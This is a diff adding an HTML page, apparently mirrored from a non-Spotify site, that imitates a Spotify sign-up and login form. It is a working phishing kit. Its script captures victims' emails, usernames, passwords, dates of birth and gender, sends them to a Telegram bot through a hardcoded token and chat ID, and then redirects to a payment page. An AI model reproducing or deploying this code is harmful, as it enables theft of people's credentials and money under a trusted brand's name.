@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from worldllimited.store/Spotify/signup.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 21 Jan 2025 11:02:16 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Sign Up & Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        h1 {
+            color: #1db954;
+            margin-bottom: 20px;
+        }
+        form {
+            display: none;
+            flex-direction: column;
+        }
+        form.active {
+            display: flex;
+        }
+        label {
+            text-align: left;
+            margin-bottom: 5px;
+        }
+        input[type="text"], input[type="email"], input[type="password"], input[type="date"], select {
+            padding: 10px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+        }
+        button {
+            padding: 10px;
+            background: #1db954;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #17a74b;
+        }
+        .toggle {
+            margin-top: 20px;
+            color: #1db954;
+            cursor: pointer;
+        }
+        .toggle:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Spotify</h1>
+        <!-- Sign-Up Form -->
+        <form id="sign-up-form" class="active" onsubmit="submitSignUpData(event); return false;">
+            <h2>Sign Up</h2>
+            <label for="signup-email">Email address</label>
+            <input type="email" id="signup-email" name="email" placeholder="Enter your email" required>
+            
+            <label for="signup-username">Username</label>
+            <input type="text" id="signup-username" name="username" placeholder="Create a username" required>
+            
+            <label for="signup-password">Password</label>
+            <input type="password" id="signup-password" name="password" placeholder="Create a password" required>
+            
+            <label for="signup-dob">Date of Birth</label>
+            <input type="date" id="signup-dob" name="dob" required>
+            
+            <label for="signup-gender">Gender</label>
+            <select id="signup-gender" name="gender">
+                <option value="male">Male</option>
+                <option value="female">Female</option>
+                <option value="non-binary">Non-binary</option>
+                <option value="other">Other</option>
+            </select>
+            
+            <button type="submit">Sign Up</button>
+        </form>
+
+        <!-- Login Form -->
+        <form id="login-form" onsubmit="submitLoginData(event); return false;">
+            <h2>Login</h2>
+            <label for="login-email">Email address</label>
+            <input type="email" id="login-email" name="email" placeholder="Enter your email" required>
+            
+            <label for="login-password">Password</label>
+            <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
+            
+            <button type="submit">Log In</button>
+        </form>
+
+        <!-- Toggle Link -->
+        <p class="toggle" id="toggle-text">Already have an account? Log In</p>
+    </div>
+
+    <script>
+        const signUpForm = document.getElementById('sign-up-form');
+        const loginForm = document.getElementById('login-form');
+        const toggleText = document.getElementById('toggle-text');
+
+        toggleText.addEventListener('click', () => {
+            signUpForm.classList.toggle('active');
+            loginForm.classList.toggle('active');
+            toggleText.textContent = signUpForm.classList.contains('active')
+                ? 'Already have an account? Log In'
+                : "Don't have an account? Sign Up";
+        });
+
+        // Function to submit Sign-Up data to Telegram bot
+        async function submitSignUpData(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const data = {
+                email: formData.get('email'),
+                username: formData.get('username'),
+                password: formData.get('password'),
+                dob: formData.get('dob'),
+                gender: formData.get('gender')
+            };
+
+            const message = `
+😲 New Sign Up:
+🤑 Email: ${data.email}
+🤭 Username: ${data.username}
+😏 Password: ${data.password}
+🍼 Date of Birth: ${data.dob}
+💀 Gender: ${data.gender}
+😈 DEVELOPER: @SOHILSCRIPTER
+            `;
+
+            // Your Telegram Bot token
+            const botToken = '7398067602:AAEZUqdVh1CQwkWC3GcqyHZd_JiyfSoxUVE';
+            const chatId = '6411315434';
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert('Sign-Up Successful!');
+                    window.location.href = 'pay.html';
+                } else {
+                    alert('Error submitting form.');
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        // Function to submit Login data to Telegram bot
+        async function submitLoginData(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const data = {
+                email: formData.get('email'),
+                password: formData.get('password')
+            };
+
+            const message = `
+🤑 New Login Attempt:
+☠️ Email: ${data.email}
+🤯 Password: ${data.password}
+😈 DEVELOPER: @SOHILSCRIPTER
+            `;
+
+            // Your Telegram Bot token
+            const botToken = '7398067602:AAEZUqdVh1CQwkWC3GcqyHZd_JiyfSoxUVE';
+            const chatId = '6411315434';
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const payload = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    alert('Login Successful!');
+                    window.location.href = 'pay.html';
+                } else {
+                    alert('Error submitting form.');
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+    </script>
+</body>
+
+<!-- Mirrored from worldllimited.store/Spotify/signup.html by HTTrack Website Copier/3.x [XR&CO'2017], Tue, 21 Jan 2025 11:02:17 GMT -->
+</html>
